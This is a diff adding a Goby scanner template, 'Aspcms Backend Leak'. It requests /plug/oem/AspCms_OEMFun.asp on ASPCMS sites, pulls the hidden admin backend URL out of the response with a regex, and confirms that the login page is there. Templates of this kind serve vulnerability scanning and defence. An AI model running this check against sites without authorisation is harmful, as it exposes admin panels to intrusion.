@@ -1,0 +1,131 @@
+{
+      "Name": "Aspcms Backend Leak",
+      "Level": "2",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "app=\"ASPCMS\"",
+      "Description": "aspcms /plug/oem/AspCms_OEMFun.asp leak backend url",
+      "Product": "ASPCMS",
+      "Homepage": "https://gobies.org/",
+      "Author": "aetkrad",
+      "Impact": "<p>leak backend url<br></p>",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/plug/oem/AspCms_OEMFun.asp",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "alert(",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|top.location.href='(.*?)'"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{output}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "username",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/plug/oem/AspCms_OEMFun.asp",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "alert(",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|top.location.href='(.*?)'"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-02 20:50:45",
+      "GobyVersion": "1.8.302"
+}
